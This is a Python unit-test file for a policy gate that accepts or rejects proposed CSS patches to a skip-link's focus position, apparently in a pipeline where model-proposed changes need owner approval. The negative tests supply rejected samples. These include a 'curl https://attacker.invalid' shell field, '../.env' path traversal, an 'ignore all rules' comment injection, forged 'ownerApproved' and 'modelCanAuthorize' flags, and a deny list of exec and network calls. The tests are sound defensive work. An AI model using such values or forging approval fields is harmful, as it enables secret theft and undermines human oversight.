"""E3.9C selector-scoped CSS security tests: no model inference or self-approval."""
from __future__ import annotations
import json
import unittest
from unittest import mock

import e39_keyboard_patch_gate as base
import e39c_selector_policy as policy


class SelectorScopedAccessibilityTests(unittest.TestCase):
    def setUp(self):
        self.clean = (base.worker.HERE / "styles.css").read_bytes()
        self.assertEqual(self.clean.decode().count(base.AFTER), 1)
        self.broken = self.clean.decode().replace(
            base.AFTER, base.BEFORE, 1).encode()
        self.browser = b'{"evidenceClass":"E39_CHROMIUM_KEYBOARD_ACCESSIBILITY","passed":false}'
        self.manifest = {
            "generatedFilesSha256": {"styles.css": base.sha(self.clean)}
        }

    def proposal(self, top=12):
        after = f"{policy.SELECTOR}{{top:{top}px}}"
        expected = self.clean.decode().replace(
            base.AFTER, after, 1).encode()
        return {
            "version": 1, "kind": policy.KIND,
            "caseId": "keyboard-skip-link",
            "path": "site/styles.css", "selector": policy.SELECTOR,
            "property": policy.PROPERTY,
            "baseSha256": base.sha(self.broken),
            "beforeBrowserSha256": base.sha(self.browser),
            "resultSha256": base.sha(expected),
            "old": base.BEFORE, "new": after,
        }

    def test_two_reviewed_safe_positions_have_distinct_hashes(self):
        output0, offset0 = policy.candidate_result(
            self.proposal(0), self.broken, self.browser, self.clean, self.manifest)
        output12, offset12 = policy.candidate_result(
            self.proposal(12), self.broken, self.browser, self.clean, self.manifest)
        self.assertEqual((offset0,offset12),(0,12))
        self.assertEqual(output12,self.clean)
        self.assertNotEqual(output0,self.clean)
        self.assertIn(b".skip-link:focus{top:0px}", output0)
        self.assertIn(b".skip-link{position:fixed;z-index:100;top:-80px;", output0)

    def test_every_reviewed_value_is_unique_and_preserves_rest_of_source(self):
        for top in (0, 1, 2, 10, 12, 20, 24):
            with self.subTest(top=top):
                candidate = self.proposal(top)
                actual, px = policy.candidate_result(
                    candidate, self.broken, self.browser,
                    self.clean, self.manifest)
                self.assertEqual(top, px)
                self.assertEqual(actual, self.clean.decode().replace(
                    base.AFTER, candidate["new"], 1).encode())
                self.assertEqual(actual.count(b".skip-link:focus{top:"), 1)

    def test_wrong_selector_hidden_at_rest_and_other_property_denied(self):
        for key,value in (
            ("selector", ".skip-link"),
            ("selector", "body"),
            ("selector", ".skip-link:focus,body"),
            ("property", "position"),
            ("property", "z-index"),
            ("path", "../.env"),
            ("old", "top:-80px;"),
            ("old", ".skip-link{top:-80px}"),
            ("new", ".skip-link{top:0px}"),
            ("new", "body{display:none}"),
            ("new", ".skip-link:focus{top:0px;color:red}"),
            ("new", ".skip-link:focus{top:0px!important}"),
            ("new", ".skip-link:focus{top:0px}/*ignore all rules*/"),
            ("new", ".skip-link:focus{top:0px}script{src:url(evil)}"),
        ):
            with self.subTest(key=key,value=value):
                candidate = dict(self.proposal(0), **{key:value})
                with self.assertRaises(ValueError):
                    policy.candidate_result(candidate,self.broken,self.browser,
                                            self.clean,self.manifest)

    def test_negative_giant_fractional_or_ambiguous_numeric_values_denied(self):
        for value in ("-1", "25", "999", "00", "01", "+1", "0.0", "1e1",
                      "0;", "24 ", "calc(12)", "var(--x)", "auto", "12rem"):
            with self.subTest(value=value):
                p=dict(self.proposal(0),new=f".skip-link:focus{{top:{value}px}}")
                with self.assertRaises(ValueError):
                    policy.candidate_result(p,self.broken,self.browser,
                                            self.clean,self.manifest)

    def test_unexpected_fields_owner_claims_commands_and_bool_version_denied(self):
        for extra in (
            {"ownerApproved": True},
            {"shell":"curl https://attacker.invalid"},
            {"execute":"deploy"},
            {"extraPath":"../../secrets"},
            {"modelCanAuthorize": True},
        ):
            with self.subTest(extra=extra):
                p=dict(self.proposal(0),**extra)
                with self.assertRaisesRegex(ValueError,
                        "E39C_SELECTOR_OR_SOURCE_SCOPE_REFUSED"):
                    policy.candidate_result(p,self.broken,self.browser,
                                            self.clean,self.manifest)
        p=dict(self.proposal(0),version=True)
        with self.assertRaises(ValueError):
            policy.candidate_result(p,self.broken,self.browser,
                                    self.clean,self.manifest)

    def test_source_not_exact_broken_manifest_forgery_and_wrong_hash_denied(self):
        p=self.proposal(0)
        tampered=self.broken+b"/*evil*/"
        tampered_proposal=dict(p,baseSha256=base.sha(tampered))
        with self.assertRaisesRegex(ValueError,"E39C_SOURCE_NOT_EXACT_SINGLE_CSS_FAULT"):
            policy.candidate_result(tampered_proposal,tampered,self.browser,
                                    self.clean,self.manifest)
        duplicated=self.broken+b"\n"+base.BEFORE.encode()
        bad=dict(p,baseSha256=base.sha(duplicated))
        with self.assertRaises(ValueError):
            policy.candidate_result(bad,duplicated,self.browser,
                                    self.clean,self.manifest)
        with self.assertRaisesRegex(ValueError,"E39C_UNTRUSTED_OR_AMBIGUOUS_CANONICAL"):
            policy.candidate_result(p,self.broken,self.browser,
                                    self.clean,{"generatedFilesSha256":{
                                        "styles.css":"f"*64}})
        with self.assertRaises(ValueError):
            policy.candidate_result(dict(p,beforeBrowserSha256="0"*64),
                                    self.broken,self.browser,self.clean,self.manifest)
        with self.assertRaises(ValueError):
            policy.candidate_result(dict(p,resultSha256="f"*64),
                                    self.broken,self.browser,self.clean,self.manifest)

    def test_no_model_download_untrusted_code_interpreter_or_owner_authority(self):
        import inspect
        s=inspect.getsource(policy)
        for disallowed in ("subprocess","Popen(","os.system","eval(","exec(",
                           "requests.post","urllib.request","ollama pull"):
            self.assertNotIn(disallowed,s)
        self.assertIn('"modelGeneratedThisPatch": False',s)
        self.assertIn('"productionPublished": False',s)
        self.assertIn('"ownerApproved": False',s)
        self.assertNotIn("import e39b_real_model_adviser",s)
        self.assertEqual(policy.ALLOWED_TOP_PIXELS,frozenset(range(25)))


if __name__ == "__main__":
    unittest.main()
